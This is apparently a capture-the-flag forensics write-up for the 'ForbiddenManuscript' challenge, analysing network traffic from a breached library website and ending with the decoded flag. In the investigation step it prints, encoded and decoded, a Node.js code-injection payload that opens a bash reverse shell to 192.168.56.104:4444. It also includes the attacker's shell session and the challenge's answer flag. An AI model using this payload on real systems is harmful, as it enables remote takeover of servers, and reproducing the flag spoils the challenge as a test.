# ForbiddenManuscript

## FLAG: HTB{f0rb1dd3n_m4nu5cr1p7_15_1n_7h3_w1ld}

## Status: Complete

+ DOCKER: No
+ DOWNLOADABLE: Yes

Description: On the haunting night of Halloween, the website of Shadowbrook Library—a digital vault of forbidden and arcane manuscripts—was silently breached by an unknown entity. Though the site appears unaltered, unsettling anomalies suggest something sinister has been stolen from its cryptic depths. Ominous network traffic logs from the time of the intrusion have emerged. Your task is to delve into this data and uncover any dark secrets that were exfiltrated.

## NOTES

1. Unzip challenge files
   1. > unzip forensics_forbidden_manuscript.zip
      1. capture.pcapng
      2. This looks like it is a network capture
      3. We will need wireshark
2. WIRESHARK
   1. On first glance it looks like a ton of HTTP and TCP traffic
      1. Looking at the heirarchy
         1. In here we see several HTTP Request & Responses and TCP traffic
   2. ENUMERATION
      1. Sort our data by all the GET requests
         1. We see several duplicates, but the main requests are:
            1. GET /
            2. GET /?user=aaaaaa
            3. GET /?user=test
            4. GET /?user=exploit%28%29%20%7B%7D%20%26%26%20%28%28%28%29%3D%3E%7B%20global.process.mainModule.require%28%22child_process%22%29.execSync%28%22bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.104%2F4444%200%3E%261%27%22%29%3B%20%7D%29%28%29%29%20%26%26%20function%20pwned
            5. GET /dark-theme.css
            6. GET /manuscripts/add
            7. GET /manuscripts/search
            8. GET /manuscripts/search?query=pumpkin
            9. GET /manuscripts/view/1
            10. GET /manuscripts/view/2
3. INVESTIGATION
   1. Out of all the GET requests there was one that really stood out
      1. GET /?user=exploit%28%29%20%7B%7D%20%26%26%20%28%28%28%29%3D%3E%7B%20global.process.mainModule.require%28%22child_process%22%29.execSync%28%22bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.104%2F4444%200%3E%261%27%22%29%3B%20%7D%29%28%29%29%20%26%26%20function%20pwned
   2. This looks to be URL encoded, lets decode this
   3. CYBERCHEF
      1. URL DECODE ->
         1. "/?user=exploit() {} && ((()=>{ global.process.mainModule.require("child_process").execSync("bash -c 'bash -i >& /dev/tcp/192.168.56.104/4444 0>&1'"); })()) && function pwned"
         2. This looks like it is a revshell
4. NEXT STEPS
   1. So I didn't find anything in the HTTP request, BUT - we should look at the TCP packets right after the REVSHELL is intialized, we might get more data from that!
   2. RIGHTCLICK -> FOLLOW -> TCP STREAM

        ```text
            .]0;root@quantum: /home/oliver/Downloads/shadowbrook-library.root@quantum:/home/oliver/Downloads/shadowbrook-library# 
            ls

            ls
            data
            docker-compose.yml
            Dockerfile
            node_modules
            package.json
            package-lock.json
            src
            .]0;root@quantum: /home/oliver/Downloads/shadowbrook-library.root@quantum:/home/oliver/Downloads/shadowbrook-library# 
            ls /

            ls /
            bin
            bin.usr-is-merged
            boot
            cdrom
            dev
            etc
            flag
            home
            lib
            lib64
            lib.usr-is-merged
            lost+found
            media
            mnt
            opt
            proc
            root
            run
            sbin
            sbin.usr-is-merged
            snap
            srv
            swap.img
            sys
            tmp
            usr
            var
            .]0;root@quantum: /home/oliver/Downloads/shadowbrook-library.root@quantum:/home/oliver/Downloads/shadowbrook-library# 
            cat /flag

            cat /flag
            4854427b66307262316464336e5f6d346e753563723170375f31355f316e5f3768335f77316c647d
            .]0;root@quantum: /home/oliver/Downloads/shadowbrook-library.root@quantum:/home/oliver/Downloads/shadowbrook-library# 
            exit

            exit
            exit
        ```

        1. BINGO!! We see in here the user runs the cat command on the flag
           1. > cat /flag
              1. 4854427b66307262316464336e5f6d346e753563723170375f31355f316e5f3768335f77316c647d
5. DECODE
   1. So now we see the flag, but it looks encoded, this particular string looks more like HEXADECIMAL, than it does BASE64
   2. CYBERCHEF
      1. FROM HEX
         1. FLAG: `HTB{f0rb1dd3n_m4nu5cr1p7_15_1n_7h3_w1ld}`
